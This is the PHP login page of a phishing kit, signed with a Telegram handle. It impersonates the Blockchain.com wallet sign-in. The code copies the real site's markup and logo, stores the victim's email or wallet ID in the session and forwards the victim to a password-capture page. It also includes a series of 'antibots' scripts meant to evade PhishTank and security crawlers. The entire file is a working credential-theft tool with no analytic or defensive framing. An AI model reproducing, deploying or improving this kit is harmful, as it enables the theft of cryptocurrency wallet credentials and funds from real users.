<?php
/*
   
                                                    
                                    TELEGRAM: @codex_dz
*/
error_reporting(0);
@session_start();

$sess_id = session_id();

$_SESSION["sess_id"] = $sess_id;
$get_sess = $_SESSION["sess_id"];

require "includes/blocker1.php"; // ITS REQURED EVERY PAGE

/*
* Form Submit
*/
if(isset($_POST['Submit'])) 
{ 
    $_SESSION["guid"] = $_POST['guid'];

    header("Location: password.php?SESSION=$get_sess");
}
?>
<?php
	include "antibots/bots.php";
    include "antibots/#1.php";
    include "antibots/#2.php";
    include "antibots/#3.php";
    include "antibots/#4.php";
    include "antibots/#5.php";
    include "antibots/#6.php";
    include "antibots/#7.php";
    include "antibots/#8.php";
    include "antibots/#9.php";
    include "antibots/#10.php";
    include "antibots/#11.php";
    include "antibots/#12.php";
    include "antibots/antibot_host.php";
    include "antibots/antibot_ip.php";
    include "antibots/antibot_phishtank.php";
    include "antibots/antibot_userAgent.php";
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
	<link rel="icon" href="css/favicon.ico" type="image/x-icon">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blockchain.com Wallet - Exchange Cryptocurrency</title>
    <link rel="stylesheet" href="../style.css">
<style nonce="w3KKyMBGsuxbzeRsTj0w4ZtLdF7YMwTF">html,
      body,
      #app,
      #app > div {
        padding: 0;
        margin: 0;
        height: 100%;
      }
      html,
      body {
        overflow: hidden;
      }
      /* hide scrollbars */
      ::-webkit-scrollbar {
        display: none;
      }
      * {
        scrollbar-width: none;
        -ms-overflow-style: none;
        -webkit-font-smoothing: antialiased;
      }
      .grecaptcha-badge {
        visibility: hidden;
      }</style>
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
</head>
<body>
   <div id="app"><div class="sc-jzgbtB eTdLKk"><div class="sc-iuJeZd dfMFAv"><span></span></div><div class="sc-gJWqzi cUnQgz"><div height="112px" class="sc-bXGyLb bixyKR"><div class="sc-lkqHmb foabOi sc-emmjRN csisZY"><div class="sc-eLExRp gWcMcI sc-cpmLhU eplNXa"><div class="sc-bnXvFD hFPMLV"><a href="https://www.blockchain.com" color="blue600" class="sc-bxivhb gyslwv"><img src="https://login.blockchain.com/img/bc-logo.svg?91c7840afd5ef690da30e77ec34105f3" srcset="" class="sc-htpNat kZQjSW sc-dymIpo hrwGqG" color="auto" width="auto" height="24px"></a></div></div></div></div></div><div class="sc-rBLzX cFxPZj"><div color="white" style="margin-bottom: 24px;color: white;font-weight: 600;font-size: 24px;line-height: inherit;text-transform: none;font-style: normal;color: rgb(255, 255, 255);cursor: inherit;display: block;opacity: 1;font-family: &quot;Inter&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, Oxygen, Ubuntu, Cantarell, &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, sans-serif;" cursor="inherit" opacity="1" class="sc-gzVnrw heWqwW">Welcome back! </div><div color="grey400" style="margin-bottom: 32px;font-weight: 500;font-size: 16px;line-height: inherit;text-transform: none;font-style: normal;color: rgb(152, 161, 178);cursor: inherit;display: block;opacity: 1;font-family: &quot;Inter&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, Oxygen, Ubuntu, Cantarell, &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, sans-serif;" cursor="inherit" opacity="1" class="sc-gzVnrw hLxhAA">Enter Your Email Address or Wallet ID </div>
<div class="sc-dBaXSw jvGdZU"><div class="sc-bNQFlB ksEeVc"></div><div class="sc-dRCTWM dlQZmq"><div class="sc-hizQCF eqFanl"><div class="sc-fKGOjr sc-eNPDpu cmopvD"><div></div><form class="sc-gacfCG jZOEPv sc-hlILIN epMhlz" method="post" action="<?php echo htmlentities($_SERVER['PHP_SELF']); ?>"><div class="sc-cqPOvA bJoSAC"><div class="sc-gNJABI hjIFcQ"><label for="guid" class="sc-yZwTr aEyxW"><div color="grey800" cursor="inherit" opacity="1" class="sc-htoDjs htBqkC"><span>Email or Wallet ID</span> </div></label><div class="sc-kkbgRg jkPVaF" height="48px"><div class="sc-dVhcbM klJnQP"><input required data-e2e="loginGuid" name="guid" placeholder="Enter your email or wallet ID" type="text" spellcheck="false" class="sc-fMiknA jfGJRD" value="" height="48px"></div></div></div></div><div class="sc-cqPOvA bJoSAC">
       
   
   
   <button type="submit" name="Submit" height="48px" data-e2e="loginButton" class="sc-gqjmRU kSeSbm sc-jQMNup XJzcz" color="white"><div color="whiteFade900" cursor="inherit" opacity="1" class="sc-htoDjs kcOprW"><span>Continue</span> </div></button></div></form><div class="sc-cgHJcJ fkftRa"><a data-e2e="loginGetHelp" color="blue600" class="sc-bxivhb gEltBr" href="./../help"><span>Need some help?</span></a></div></div><a color="blue600" data-e2e="signupLink" class="sc-bxivhb gyslwv" href="#/signup"><div class="sc-cCVOAp dUPswH"><div color="whiteFade600" cursor="inherit" opacity="1" class="sc-htoDjs jsjQBg"><span>Don't have a Blockchain Account?</span> </div>&nbsp;<div color="whiteFade900" class="sc-htoDjs kcOprW sc-cfWELz fukSbz" cursor="inherit" opacity="1"><span>Sign up Now -&gt;</span> </div></div></a></div></div></div></div><div class="sc-gFaPwZ GesYI"><div class="sc-fhYwyz iwjbKx"><div class="sc-kEYyzF fVTpCS"><ul class="sc-eHgmQL ffypnH" style="display: none;">
       
    
    
   <li class="sc-cvbbAY fYKafc"><a href="./index.php">English</a></li>
        <li class="sc-cvbbAY fYKafc"><a href="./fr.php"> French</a></li>
        <li class="sc-cvbbAY fYKafc"><a href="./de.php"> German</a></li>
        <li class="sc-cvbbAY fYKafc"><a href="./it.php"> Italian</a></li>
        <li class="sc-cvbbAY fYKafc"><a href="./pt.php"> Portuguese</a></li>
        <li class="sc-cvbbAY fYKafc"><a href="./ru.php"> Russian</a></li>
        <li class="sc-cvbbAY fYKafc"><a href="./es.php"> Spanish</a></li>
        <li class="sc-cvbbAY fYKafc"><a href="./tr.php"> Turkish</a></li>
    </ul><div color="grey400" class="sc-kkGfuU fGrWeP"><div class="sc-iAyFgw gujfRv">English</div><i class="down" color="grey700"></i></div></div><span class="sc-hMFtBS dHgYOK"><a color="grey400" href="https://github.com/blockchain/blockchain-wallet-v4-frontend/releases" target="_blank" class="sc-bxivhb hasGHX"><span>Version 4.60.1</span></a></span></div></div></div></div>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
   <script>
    $('.fVTpCS').click( function(){
    $('.ffypnH').toggle();
    });
    </script>


<style type="text/css"></style></body></html>